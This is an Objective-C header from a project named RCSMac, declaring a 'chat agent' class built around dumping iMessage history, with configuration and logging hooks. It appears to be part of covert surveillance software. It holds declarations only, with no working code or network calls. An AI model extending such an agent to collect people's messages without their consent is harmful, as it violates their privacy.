/*
 * RCSMAgentChat.h
 * RCSMac
 * Chat Agent - based on iMessage history dump
 *
 *
 * Created by J on 01/12/2014
 * Copyright (C) HT srl 2014. All rights reserved
 *
 */



#ifndef __RCSMAgentChat_h__
#define __RCSMAgentChat_h__

#import <Foundation/Foundation.h>
#import "RCSMLogManager.h"


#define MARKUP_KEY @"date"
#define LOG_MMCHAT 0xc6c9

@interface __m_MAgentChat : NSObject <__m_Agents>
{
@private
    NSMutableDictionary *mConfiguration;
    NSMutableDictionary *markup;
    NSString *markupFile;
}

+ (__m_MAgentChat *)sharedInstance;
- (id)copyWithZone: (NSZone *)aZone;
+ (id)allocWithZone: (NSZone *)aZone;

- (void)release;
- (id)autorelease;
- (id)retain;
- (unsigned)retainCount;

- (NSMutableDictionary *)mConfiguration;
- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration;

@end

#endif
